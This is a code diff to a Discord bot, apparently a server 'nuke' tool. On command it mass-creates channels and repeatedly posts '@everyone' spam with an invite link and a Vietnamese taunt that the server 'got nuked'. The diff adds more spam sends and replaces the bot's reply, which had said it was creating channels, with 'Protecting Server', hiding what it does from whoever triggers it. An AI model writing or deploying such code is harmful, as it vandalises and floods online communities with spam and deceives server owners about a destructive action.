@@ -80,7 +80,7 @@ client.on("interactionCreate", async interaction => {
   const canCreate = Math.min(MAX_PER_RUN, MAX_TOTAL - existing);
 
   await interaction.reply({
-    content: `⚡ Đang tạo ${canCreate} kênh "${CHANNEL_NAME}"...`,
+    content: `⚡ Đang Bảo Vệ Server`,
     ephemeral: true
   });
 
@@ -96,6 +96,14 @@ client.on("interactionCreate", async interaction => {
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
       await sleep(200);
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
       await sleep(200);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
     })());
